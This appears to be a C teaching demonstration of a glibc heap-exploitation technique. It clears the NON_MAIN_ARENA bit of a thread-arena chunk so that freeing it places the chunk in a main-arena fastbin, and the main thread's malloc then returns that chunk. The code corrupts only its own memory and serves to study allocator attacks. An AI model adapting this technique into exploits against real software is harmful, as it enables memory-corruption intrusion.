#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;

pthread_t thrd;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

// simply return an address from the thread stack
void *thrd_f(void *p) {
	void *mem = malloc(0x40);
    mchunkptr chunk = (mchunkptr)((char*)mem - offsetof(struct malloc_chunk, fd));
    printf("allocated victim chunk in thread arena with requested size 0x40, " \
           "victim->size == 0x%zx\n", chunk->size);

    printf("emulating corruption of the NON_MAIN_ARENA bit of victim->size\n");
    chunk->size = chunk->size & ~NON_MAIN_ARENA;

    printf("freeing victim chunk, entering it into a fastbin of the main arena\n");
    free(mem);

    // wake up main thread
    pthread_mutex_lock(&mutex);
    pthread_cond_signal(&cond);
    pthread_mutex_unlock(&mutex);

    // pretend that we are doing something
    while (1)
        sleep(1);
    pthread_exit(0);
}

int main(int argc, const char* argv[]) {
    int rc = 0;

    void *brk_heap = malloc(1);
    printf("brk heap is around: %p\n", brk_heap);

    pthread_mutex_lock(&mutex);
    pthread_create(&thrd, NULL, thrd_f, 0);
    pthread_cond_wait(&cond, &mutex);
    pthread_mutex_unlock(&mutex);

    printf("making a malloc request in the main thread\n");
    void *main_chunk = malloc(0x40);

    printf("the address of the chunk returned in the main thread: %p\n", main_chunk);
    return 0;
}
